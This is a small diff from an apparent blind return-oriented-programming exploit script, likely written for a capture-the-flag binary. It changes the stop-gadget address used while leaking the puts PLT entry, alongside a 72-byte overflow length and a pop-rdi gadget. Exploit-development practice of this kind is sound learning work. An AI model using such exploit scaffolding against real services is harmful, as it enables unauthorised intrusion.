@@ -21,7 +21,7 @@ def get_puts(length,rdi_ret,stop_gaddet):
 
 length = 72
 rdi_ret = 0x4007ba + 0x9
-stop_gadget = 0x4006d5
+stop_gadget = 0x4005c0
 puts = get_puts(length,rdi_ret,stop_gadget)
 #find puts_add --> [0x400565]
 #puts_plt = 0x400560
